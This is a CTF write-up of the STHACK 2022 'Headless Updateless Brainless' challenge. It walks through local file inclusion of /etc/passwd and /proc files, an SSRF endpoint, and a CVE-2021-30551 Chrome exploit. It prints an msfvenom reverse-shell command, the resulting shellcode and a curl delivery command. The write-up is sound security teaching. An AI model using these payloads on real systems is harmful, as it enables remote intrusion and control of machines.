# Introduction

During the [STHACK 2022](https://sthack.fr) (CTF event \@Bordeaux
France), **[Laluka](https://twitter.com/TheLaluka)** has created few web
challenges including the **Headless Updateless Brainless** challenge
that had a \"pwn\" exploitation step.

To be honest, this challenge was not resolved by our team during the
CTF. Got stuck at the last final exploitation step. After chatting with
Laluka, he agreed to give us an access and try one more time to solve
it.

And this time, it worked great!

# Recon

## Main feature

The challenge URL displays the following page:

![](https://www.opencyber.com/wp-content/uploads/2022/05/chall_web_first_page-1.png)

The parameter **file** seems very interesting.

## Local File inclusion

The first try was to inject some local files into the parameter file,
like \"/etc/passwd\".

![](https://www.opencyber.com/wp-content/uploads/2022/05/CHALL_LFI_3-3.png)

As you can see, there is a user **chrome**. Maybe an hint for one next
step!

Next file: **/proc/mounts**

![](https://www.opencyber.com/wp-content/uploads/2022/05/CHALL_LFI_0-1.png)

There is the file **flag_random_name\_\*** in the root directory. But it
is not reachable directly with this first vulnerability. You will understand why exactly after leaking another file.

Also, there is a **/site** as well. There source code could be stored
here.

Next file: **/proc/self/cmdline**. This file is interesting to
understand what the comand line of the current process is doing:

![](https://www.opencyber.com/wp-content/uploads/2022/05/CHALL_LFI_1-1.png)

This is actually \"node chall.js\". The filename is **chall.js** which
may be located in the /site directory. Let\'s leak it using the same
vulnerability.

The bellow part of the source code shows why it is not possible to reach
the flag file using the first vulnerability.

![](https://www.opencyber.com/wp-content/uploads/2022/05/FLAG_FORBID-1.png)

By analyzing the rest of the source code, we can notice a new endpoint
which is **\"/coolish-unguessable-feature\"**.

![](https://www.opencyber.com/wp-content/uploads/2022/05/CHALL_LFI_4-1.png)

Let\'s reach it:

![](https://www.opencyber.com/wp-content/uploads/2022/05/PART2_GET2-1.png)

Reading the source code, a new parameter **\"url\"** can be added to the
URL:

![](https://www.opencyber.com/wp-content/uploads/2022/05/LEAK_CODE_1-1.png)

The parameter needs to start with **\"http\"** in order to take a
screenshot of the remote page. The **takeScreenshot** function is the
following:

![](https://www.opencyber.com/wp-content/uploads/2022/05/LEAK_CODE_2-2-1024x169.png)

The parameter **url** is controlled by the user. Let\'s try to make the
application reach ourself using the following payload:

``` {.wp-block-syntaxhighlighter-code .code}
http://headless-updateless-brainless.sthack.fr/coolish-unguessable-feature?url=http://IP:PORT/test
```

![](https://www.opencyber.com/wp-content/uploads/2022/05/CHALL_BROWSER_OUTDATED-1024x214.png)

We retrieve the Chrome version which seems very interesting (and not up to date).

## Browser vulnerability - Recon

So the browser used Chrome on version **89.0.4389.72**.

A quick (**no, kidding, it took times!**) research on
<https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=chrome> lead to the
following CVE:

**CVE-2021-30551** - Type confusion in V8 in Google Chrome prior to
91.0.4472.101 allowed a remote attacker to potentially exploit heap
corruption via a crafted HTML page.

Searching a Proof-of-Concept, the following link helped us to exploit
the vulnerability: <https://github.com/xmzyshypnc/CVE-2021-30551>.

Only the shellcode at the end of the PoC needs to be modified.

## Browser vulnerability - (Local exploitation)

### Building the shellcode - (Local exploitation)

Using msfvenom helped to build the shellcode:

``` {.wp-block-syntaxhighlighter-code .code}
msfvenom -p linux/x64/shell_reverse_tcp -a x64 --platform linux LHOST=192.168.122.1 LPORT=4444 -f hex

#Output: 6a2958996a025f6a015e0f05489748b90200115cc0a87a01514889e66a105a6a2a580f
#056a035e48ffce6a21580f0575f66a3b589948bb2f62696e2f736800534889e752574889e60f05
```

Let\'s change the shellcode by using a vim trick to add 0x before the
hexa value, and a comma:

![](https://www.opencyber.com/wp-content/uploads/2022/05/SC_MSFVENOM-1-1024x100.png)

This will take two values of hexa, add a prefix **,0x** to the pattern
found from the regex, which gives:

``` {.wp-block-syntaxhighlighter-code .code}
,0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,0x01,0x5e,0x0f,0x05,0x48,0x97,0x48,0xb9,0x02,
0x00,0x11,0x5c,0xc0,0xa8,0x7a,0x01,0x51,0x48,0x89,0xe6,0x6a,0x10,0x5a,0x6a,0x2a,0x58,
0x0f,0x05,0x6a,0x03,0x5e,0x48,0xff,0xce,0x6a,0x21,0x58,0x0f,0x05,0x75,0xf6,0x6a,0x3b,
0x58,0x99,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,0x89,0xe7,0x52,
0x57,0x48,0x89,0xe6,0x0f,0x05
```

Anyway, the new shellcode line is:

``` {.wp-block-syntaxhighlighter-code .code}
let shellcode = [0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,0x01,0x5e,0x0f,0x05,0x48,0x97,0x48,0xb9,
0x02,0x00,0x11,0x5c,0xc0,0xa8,0x7a,0x01,0x51,0x48,0x89,0xe6,0x6a,0x10,0x5a,0x6a,
0x2a,0x58,0x0f,0x05,0x6a,0x03,0x5e,0x48,0xff,0xce,0x6a,0x21,0x58,0x0f,0x05,0x75,
0xf6,0x6a,0x3b,0x58,0x99,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,
0x48,0x89,0xe7,0x52,0x57,0x48,0x89,0xe6,0x0f,0x05];
```

### Remote Code Execution - (Local exploitation)

Let\'s the application get our .html file:

``` {.wp-block-syntaxhighlighter-code .code}
curl http://192.168.122.141:8082/coolish-unguessable-feature?url=http://:192.168.122.1:8000/exploit.html
```

The exploit.html file is reached which lead to exploit the vulnerability
that gives us a shell:

![](https://www.opencyber.com/wp-content/uploads/2022/05/RCE-1.png)

Thus the flag was\... Oops, cannot say, did not get the one during the
night!

Thanks **[Laluka](https://twitter.com/TheLaluka)** for the challenge and
the [STHACK](https://sthack.fr) for the event!

The challenges have been made public and can be found here:
[https://gitlab.com/TheLaluka/headless-updateless-brainless](https://gitlab.com/TheLaluka/headless-updateless-brainless)

